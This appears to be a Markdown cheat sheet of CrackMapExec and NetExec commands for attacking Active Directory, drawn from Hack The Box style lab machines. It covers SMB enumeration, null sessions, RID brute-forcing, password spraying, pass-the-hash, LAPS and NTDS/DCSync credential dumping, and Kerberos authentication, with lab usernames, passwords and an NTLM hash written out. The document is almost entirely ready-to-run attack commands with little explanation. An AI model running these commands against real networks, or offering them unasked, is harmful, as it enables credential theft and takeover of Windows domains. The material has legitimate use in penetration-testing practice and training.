# # `Commands` -

1. Smb Enumeration -

```bash
crackmapexec smb dc01.timelapse.htb
```

2. List shares -

```bash
crackmapexec smb dc01.timelapse.htb --shares
```

```bash
crackmapexec smb 10.10.11.202 -u napster -p '' --shares
```

3. Smb null authentication -

```bash
crackmapexec smb dc01.timelapse.htb --shares -u nap -p ''
```

4. RID Bruteforce/Finding Usernames -

```bash
netexec smb 10.10.11.236 -u guest -p '' --rid-brute
```

5. Password Spray -

```bash
crackmapexec smb 10.10.10.248 -u final_userlist -p NewIntelligenceCorpUser9876
```

[giving userlist and specific password]

```bash
crackmapexec smb 10.10.11.158 -u user -p pass --no-bruteforce --continue-on-success
```

With the `--no-bruteforce` option, it will match each user with the corresponding password (rather than trying all with all as is the default behavior).

- Hash Bruteforce -

```bash
crackmapexec smb htb.local -u henry.vinson -H hashes
```

6. Identify ADCS -

One thing that always needs enumeration on a Windows domain is to look for `Active Directory Certificate Services (ADCS)`. A quick way to check for this is using crackmapexec :

```bash
crackmapexec ldap 10.10.11.202 -u ryan.cooper -p NuclearMosquito3 -M adcs
```

7. Check whether Smb Signing Enabled/Disabled (Ntlm relay Attacks) :

```bash
cme smb 10.10.150.53 --gen-relay-list relay.txt 
```

8. Using Bloodhound :

```bash
cme ldap dc01.reflection.vl -u 'abbie.smith' -p 'napster' -ns 10.10.150.53 --bloodhound -c all
```

[-c  optional]

9. Checking MachineAccountQuota (RBCD) :

```bash
cme ldap dc01.reflection.vl -u 'abbie.smith' -p 'napster' -M maq
```

10. Dumping LAPS password -

```bash
crackmapexec smb 10.10.11.158 -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' --laps --ntds
```

11. Kerberos Authentication -

```bash
crackmapexec smb hathor.windcorp.htb -k -d windcorp.htb -u beatricemill -p '!!!!ilovegood17' --shares
```

-   `smb` - protocol to use
-   `hathor.windcorp.htb` - the full hostname, not the IP or domain name (this is important for Kerberos)
-   `-k` - use kerberos auth
-   `-d windcorp.htb` - domain
-   `-u beatricemill` - username
-   `-p '!!!!ilovegood17'` - password
-   `--shares` - list the shares

12. Connecting to LDAP and dumping list of Users using Kerberos Authentication :

```bash
crackmapexec ldap 10.10.11.181 -u d.klay -p 'Darkmoonsky248girl' -k --users
```

Not only does it give the users, but also the description field if it’s populated.

13. Dumping NTDS DC Sync :

```bash
napster@hacky$ crackmapexec smb -dc-ip dc.absolute.htb -u 'DC$' -H A7864AB463177ACB9AEC553F18F42577 --ntds
```

14. Dumping User via Smb :

```bash
crackmapexec smb 10.10.11.187 -u svc_apache -p 'S@Ss!K@*t13' -d flight.htb --users
```

15. Checking Password Policy :

```bash
crackmapexec smb 192.168.56.11 --pass-pol
```

16. Check if Spooler is active :

```bash
crackmapexec smb 192.168.56.10-23 -M spooler
```

## # `Error Diagonsis` -

1. Trying to validate that with `crackmapexec` fails :

```bash
crackmapexec smb 10.10.11.181 -u d.klay -p 'Darkmoonsky248girl'
SMB         10.10.11.181    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.181    445    DC               [-] absolute.htb\d.klay:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION 
```

`STATUS_ACCOUNT_RESTRICTION` typically means NTLM is disabled, and you’ll need to use Kerberos for auth.

```bash
crackmapexec smb 10.10.11.181 -u d.klay -p 'Darkmoonsky248girl' -k
SMB         10.10.11.181    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.181    445    DC               [+] absolute.htb\d.klay:Darkmoonsky248girl 
```

